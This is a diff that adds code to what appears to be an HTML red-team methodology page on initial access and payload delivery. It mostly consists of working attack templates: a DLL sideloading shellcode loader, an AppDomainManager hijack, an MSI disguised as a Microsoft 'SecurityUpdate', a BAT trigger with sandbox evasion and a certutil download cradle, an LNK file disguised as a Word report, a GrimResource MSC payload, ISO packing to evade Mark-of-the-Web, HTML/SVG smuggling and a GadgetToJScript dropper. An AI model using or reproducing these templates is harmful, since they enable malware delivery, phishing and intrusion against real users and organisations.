@@ -7141,6 +7141,36 @@ https-certificate {
         <li><input type="checkbox" data-id="methodology-initial-access-payload-delivery-wf-0-3"> Place alongside the legitimate binary and execute normally</li>
       </ul>
     </li>
+  </ul>
+<pre><code class="language-c">// DLL Sideloading Skeleton — proxy DLL with payload execution
+// Compile: x86_64-w64-mingw32-gcc -shared -o version.dll sideload.c -luser32
+
+#include &lt;windows.h&gt;
+
+// Forward legitimate exports to the real DLL
+// (use DLL Export Viewer to list exports from the original DLL)
+#pragma comment(linker, "/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.dll.GetFileVersionInfoA")
+#pragma comment(linker, "/export:GetFileVersionInfoW=C:\\Windows\\System32\\version.dll.GetFileVersionInfoW")
+#pragma comment(linker, "/export:GetFileVersionInfoSizeA=C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeA")
+#pragma comment(linker, "/export:GetFileVersionInfoSizeW=C:\\Windows\\System32\\version.dll.GetFileVersionInfoSizeW")
+#pragma comment(linker, "/export:VerQueryValueA=C:\\Windows\\System32\\version.dll.VerQueryValueA")
+#pragma comment(linker, "/export:VerQueryValueW=C:\\Windows\\System32\\version.dll.VerQueryValueW")
+
+void Payload() {
+    // Your shellcode loader / C2 callback here
+    unsigned char sc[] = { /* shellcode bytes */ };
+    void *mem = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    memcpy(mem, sc, sizeof(sc));
+    ((void(*)())mem)();
+}
+
+BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Payload, NULL, 0, NULL);
+    }
+    return TRUE;
+}</code></pre>
+  <ul>
     <li><input type="checkbox" data-id="methodology-initial-access-payload-delivery-wf-1"> AppDomainManager hijack for .NET applications:
       <ul>
         <li><input type="checkbox" data-id="methodology-initial-access-payload-delivery-wf-1-0"> Set environment variables: <code>APPDOMAIN_MANAGER_ASM</code> and <code>APPDOMAIN_MANAGER_TYPE</code></li>
@@ -7148,6 +7178,34 @@ https-certificate {
         <li><input type="checkbox" data-id="methodology-initial-access-payload-delivery-wf-1-2"> The CLR loads your assembly before the application&rsquo;s entry point</li>
       </ul>
     </li>
+  </ul>
+<pre><code class="language-xml">&lt;!-- AppDomainManager hijack — place as TargetApp.exe.config --&gt;
+&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;configuration&gt;
+  &lt;runtime&gt;
+    &lt;appDomainManagerAssembly value="Hijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" /&gt;
+    &lt;appDomainManagerType value="Hijack.PayloadManager" /&gt;
+  &lt;/runtime&gt;
+&lt;/configuration&gt;</code></pre>
+<pre><code class="language-csharp">// Hijack.cs — AppDomainManager that runs payload before the real app
+// Compile: csc /target:library /out:Hijack.dll Hijack.cs
+using System;
+
+namespace Hijack {
+    public class PayloadManager : AppDomainManager {
+        public override void InitializeNewDomain(AppDomainSetup info) {
+            // Payload executes before the host application's Main()
+            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo {
+                FileName = "powershell.exe",
+                Arguments = "-nop -w hidden -enc &lt;base64-payload&gt;",
+                UseShellExecute = false,
+                CreateNoWindow = true
+            });
+        }
+    }
+}
+// Place Hijack.dll + TargetApp.exe.config alongside the target .NET binary</code></pre>
+  <ul>
     <li><input type="checkbox" data-id="methodology-initial-access-payload-delivery-wf-2"> Windows Installer MSI with custom action:
       <ul>
         <li><input type="checkbox" data-id="methodology-initial-access-payload-delivery-wf-2-0"> Build an MSI with a custom action pointing to your payload DLL or EXE</li>
@@ -7155,6 +7213,32 @@ https-certificate {
         <li><input type="checkbox" data-id="methodology-initial-access-payload-delivery-wf-2-2"> MSI execution is trusted by many environments and survives some app-control policies</li>
       </ul>
     </li>
+  </ul>
+<pre><code class="language-xml">&lt;!-- WiX MSI with custom action — payload DLL executed during install --&gt;
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;Wix xmlns="http://schemas.microsoft.com/wix/2006/wi"&gt;
+  &lt;Product Id="*" Name="SecurityUpdate" Version="1.0.0"
+           Manufacturer="Microsoft" Language="1033"
+           UpgradeCode="PUT-GUID-HERE"&gt;
+    &lt;Package InstallerVersion="200" Compressed="yes"
+             InstallScope="perUser" /&gt;
+    &lt;MediaTemplate EmbedCab="yes" /&gt;
+
+    &lt;Binary Id="PayloadDll" SourceFile="payload.dll" /&gt;
+    &lt;CustomAction Id="RunPayload" BinaryKey="PayloadDll"
+                  DllEntry="EntryPoint" Execute="immediate"
+                  Return="ignore" /&gt;
+
+    &lt;InstallExecuteSequence&gt;
+      &lt;Custom Action="RunPayload" Before="InstallFinalize" /&gt;
+    &lt;/InstallExecuteSequence&gt;
+
+    &lt;Directory Id="TARGETDIR" Name="SourceDir" /&gt;
+    &lt;Feature Id="Main" Level="1" /&gt;
+  &lt;/Product&gt;
+&lt;/Wix&gt;
+&lt;!-- Build: candle installer.wxs &amp;&amp; light installer.wixobj -o update.msi --&gt;</code></pre>
+  <ul>
     <li><input type="checkbox" data-id="methodology-initial-access-payload-delivery-wf-3"> Excel Add-In for persistence-capable delivery:
       <ul>
         <li><input type="checkbox" data-id="methodology-initial-access-payload-delivery-wf-3-0"> Compile payload as <code>.xlam</code> add-in</li>
@@ -7173,6 +7257,31 @@ https-certificate {
         <li><input type="checkbox" data-id="methodology-initial-access-triggers-containers-wf-0-2"> Execute the payload via the BAT; use LOLBAS for indirect execution</li>
       </ul>
     </li>
+  </ul>
+<pre><code class="language-batch">@echo off
+REM --- BAT trigger with sandbox evasion ---
+
+REM Sandbox check: %cmdcmdline% differs between user double-click and automated execution
+REM Double-click: "C:\Windows\system32\cmd.exe" /c ""C:\path\trigger.bat""
+REM Sandbox/cmd:  cmd.exe or "C:\Windows\system32\cmd.exe"
+echo %cmdcmdline% | findstr /i /c:"\"\"" &gt; nul
+if %errorlevel% neq 0 (
+    REM Not launched by double-click — likely sandbox or manual cmd
+    exit /b
+)
+
+REM Domain-join check (skip if not in target environment)
+whoami /fqdn 2&gt;nul | findstr /i "target-domain" &gt; nul
+if %errorlevel% neq 0 exit /b
+
+REM Execute payload via LOLBAS
+REM Option 1: rundll32 with DLL in same directory
+rundll32.exe "%~dp0payload.dll",EntryPoint
+
+REM Option 2: certutil download cradle
+REM certutil -urlcache -split -f http://[ip]/payload.exe %TEMP%\svc.exe
+REM start /b %TEMP%\svc.exe</code></pre>
+  <ul>
     <li><input type="checkbox" data-id="methodology-initial-access-triggers-containers-wf-1"> LNK trigger via COM:
       <ul>
         <li><input type="checkbox" data-id="methodology-initial-access-triggers-containers-wf-1-0"> Create with <code>WScript.Shell</code> COM object</li>
@@ -7180,6 +7289,29 @@ https-certificate {
         <li><input type="checkbox" data-id="methodology-initial-access-triggers-containers-wf-1-2"> Customize the icon to match a document type the target expects</li>
       </ul>
     </li>
+  </ul>
+<pre><code class="language-powershell"># Create a malicious LNK file via COM
+$wsh = New-Object -ComObject WScript.Shell
+$lnk = $wsh.CreateShortcut("$env:TEMP\Q4-Report.lnk")
+
+# Option 1: Direct payload execution
+$lnk.TargetPath = "C:\Windows\System32\rundll32.exe"
+$lnk.Arguments = "payload.dll,EntryPoint"
+
+# Option 2: LOLBAS — use a trusted binary for indirect execution
+$lnk.TargetPath = "C:\Windows\System32\cmd.exe"
+$lnk.Arguments = "/c start /b rundll32.exe \\server\share\payload.dll,Run"
+
+# Set icon to look like a Word document
+$lnk.IconLocation = "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,0"
+$lnk.Description = "Quarterly Financial Report"
+$lnk.WorkingDirectory = "C:\Windows\System32"
+$lnk.WindowStyle = 7  # minimized
+$lnk.Save()
+
+# Verify
+Get-Item "$env:TEMP\Q4-Report.lnk" | Select-Object Name,Length</code></pre>
+  <ul>
     <li><input type="checkbox" data-id="methodology-initial-access-triggers-containers-wf-2"> MSC trigger (GrimResource):
       <ul>
         <li><input type="checkbox" data-id="methodology-initial-access-triggers-containers-wf-2-0"> Abuse XSS in <code>mmc.exe</code> via a crafted MSC file</li>
@@ -7187,6 +7319,33 @@ https-certificate {
         <li><input type="checkbox" data-id="methodology-initial-access-triggers-containers-wf-2-2"> No macro warning &mdash; executes when the user opens the MSC</li>
       </ul>
     </li>
+  </ul>
+<pre><code class="language-xml">&lt;!-- GrimResource — MSC file with embedded XSS in mmc.exe --&gt;
+&lt;?xml version="1.0"?&gt;
+&lt;MMC_ConsoleFile ConsoleVersion="3.0"&gt;
+  &lt;StringTables&gt;
+    &lt;StringTable&gt;
+      &lt;Strings&gt;
+        &lt;String ID="1"&gt;
+          &lt;!-- XSS payload in the StringTable — mmc.exe renders this via MSHTML --&gt;
+          &lt;script&gt;
+            var shell = new ActiveXObject("WScript.Shell");
+            shell.Run("powershell -nop -w hidden -enc &lt;base64-payload&gt;", 0, false);
+          &lt;/script&gt;
+        &lt;/String&gt;
+      &lt;/Strings&gt;
+    &lt;/StringTable&gt;
+  &lt;/StringTables&gt;
+  &lt;Views&gt;
+    &lt;View&gt;
+      &lt;ViewType&gt;HTMLView&lt;/ViewType&gt;
+      &lt;!-- Point to a resource that triggers the StringTable rendering --&gt;
+      &lt;ViewOptions URL="res://apds.dll/redirect.html?target=javascript:
+        eval(document.getElementById('payload').innerHTML)" /&gt;
+    &lt;/View&gt;
+  &lt;/Views&gt;
+&lt;/MMC_ConsoleFile&gt;</code></pre>
+  <ul>
     <li><input type="checkbox" data-id="methodology-initial-access-triggers-containers-wf-3"> Container wrapping for MotW bypass:
       <ul>
         <li><input type="checkbox" data-id="methodology-initial-access-triggers-containers-wf-3-0"> ISO/IMG: mount as a virtual drive, files inside have no MotW</li>
@@ -7196,6 +7355,25 @@ https-certificate {
       </ul>
     </li>
   </ul>
+<pre><code class="language-bash"># PackMyPayload — pack files into ISO/IMG containers
+# Hide the DLL, show only the LNK
+python3 PackMyPayload.py -H payload.dll -o delivery.iso trigger.lnk payload.dll
+
+# mkisofs — manual ISO creation (Linux)
+mkdir iso_staging
+cp trigger.lnk iso_staging/
+cp payload.dll iso_staging/
+attrib +h iso_staging/payload.dll  # or set hidden in the ISO metadata
+mkisofs -o delivery.iso -J -r iso_staging/
+
+# oscdimg — Windows ISO creation (from ADK)
+oscdimg -lCDROM -j1 iso_staging delivery.iso
+
+# IMG container (virtual floppy — also bypasses MotW)
+# Use PowerShell to create a VHD/IMG
+$vhd = New-VHD -Path .\delivery.img -SizeBytes 10MB -Dynamic
+Mount-VHD -Path .\delivery.img
+# Copy files to mounted drive, then dismount</code></pre>
 
 <h4 id="methodology-initial-access-html-smuggling">13.2.3 HTML Smuggling</h4>
   <ul>
@@ -7206,6 +7384,32 @@ https-certificate {
         <li><input type="checkbox" data-id="methodology-initial-access-html-smuggling-wf-0-2"> The file is assembled in the browser &mdash; no network-level file transfer to inspect</li>
       </ul>
     </li>
+  </ul>
+<pre><code class="language-html">&lt;!-- HTML Smuggling — base64 blob download --&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;p&gt;Your document is loading, please wait...&lt;/p&gt;
+&lt;script&gt;
+  // Base64-encoded payload (ISO/EXE/DLL)
+  var b64 = "TVqQAAMAAAAEAAAA...";  // full base64 string here
+  var raw = atob(b64);
+  var arr = new Uint8Array(raw.length);
+  for (var i = 0; i &lt; raw.length; i++) {
+      arr[i] = raw.charCodeAt(i);
+  }
+  var blob = new Blob([arr], {type: "application/octet-stream"});
+  var url = URL.createObjectURL(blob);
+  var a = document.createElement("a");
+  a.href = url;
+  a.download = "Quarterly-Report.iso";
+  document.body.appendChild(a);
+  a.click();
+  // Clean up
+  window.URL.revokeObjectURL(url);
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+  <ul>
     <li><input type="checkbox" data-id="methodology-initial-access-html-smuggling-wf-1"> SVG smuggling variant:
       <ul>
         <li><input type="checkbox" data-id="methodology-initial-access-html-smuggling-wf-1-0"> Embed the base64 payload inside an SVG image element</li>
@@ -7213,6 +7417,27 @@ https-certificate {
         <li><input type="checkbox" data-id="methodology-initial-access-html-smuggling-wf-1-2"> Less inspected than raw HTML attachments by email gateways</li>
       </ul>
     </li>
+  </ul>
+<pre><code class="language-html">&lt;!-- SVG Smuggling — embed payload inside an SVG image --&gt;
+&lt;svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"&gt;
+  &lt;script type="text/javascript"&gt;
+    // Base64-encoded payload (EXE/DLL/ISO)
+    var b64 = "TVqQAAMAAAAEAAAA...";  // truncated
+    var raw = atob(b64);
+    var arr = new Uint8Array(raw.length);
+    for (var i = 0; i &lt; raw.length; i++) arr[i] = raw.charCodeAt(i);
+    var blob = new Blob([arr], {type: "application/octet-stream"});
+    var url = URL.createObjectURL(blob);
+    var a = document.createElement("a");
+    a.href = url;
+    a.download = "Q4-Report.iso";
+    document.body.appendChild(a);
+    a.click();
+  &lt;/script&gt;
+  &lt;!-- Visible content to look legitimate --&gt;
+  &lt;text x="10" y="50" font-size="8"&gt;Loading preview...&lt;/text&gt;
+&lt;/svg&gt;</code></pre>
+  <ul>
     <li><input type="checkbox" data-id="methodology-initial-access-html-smuggling-wf-2"> Cobalt Strike Site Clone integration:
       <ul>
         <li><input type="checkbox" data-id="methodology-initial-access-html-smuggling-wf-2-0"> Clone a legitimate login page via CS Attacks &rarr; Web Drive-By &rarr; Clone Site</li>
@@ -7228,9 +7453,29 @@ https-certificate {
       </ul>
     </li>
   </ul>
-<p><strong>References:</strong> <a href="https://attack.mitre.org/techniques/T1059/" target="_blank" rel="noopener noreferrer">MITRE T1059 Cmd & Script</a></p>
+<pre><code class="language-csharp">// GadgetToJScript / DotNetToJScript — .NET assembly loader from JScript
+// 1. Build a C# class that implements a serializable gadget
+using System;
+using System.Runtime.Serialization;
+using System.Diagnostics;
 
-<p><strong>General references:</strong> <a href="https://attack.mitre.org/techniques/T1059/" target="_blank" rel="noopener noreferrer">MITRE T1059 Cmd & Script</a> &middot; <a href="https://outflank.nl/blog/" target="_blank" rel="noopener noreferrer">Outflank blog</a></p>
+[Serializable]
+public class PayloadRunner : ISerializable {
+    public PayloadRunner() {
+        // Constructor executes on deserialization
+        Process.Start(new ProcessStartInfo {
+            FileName = "powershell.exe",
+            Arguments = "-nop -w hidden -enc &lt;base64-payload&gt;",
+            UseShellExecute = false,
+            CreateNoWindow = true
+        });
+    }
+    public void GetObjectData(SerializationInfo info, StreamingContext ctx) { }
+}
+
+// 2. Compile: csc /target:library /out:payload.dll payload.cs
+// 3. Convert: GadgetToJScript.exe -w js -o dropper.js -a payload.dll
+// 4. The output .js file deserializes the gadget, triggering execution</code></pre>
 
 <h3 id="methodology-post-exploitation">13.3 Post Exploitation</h3>
 <p>Once a Beacon checks in, gather situational awareness before any lateral movement. Understand the command categories to choose the right OPSEC level for each action.</p>
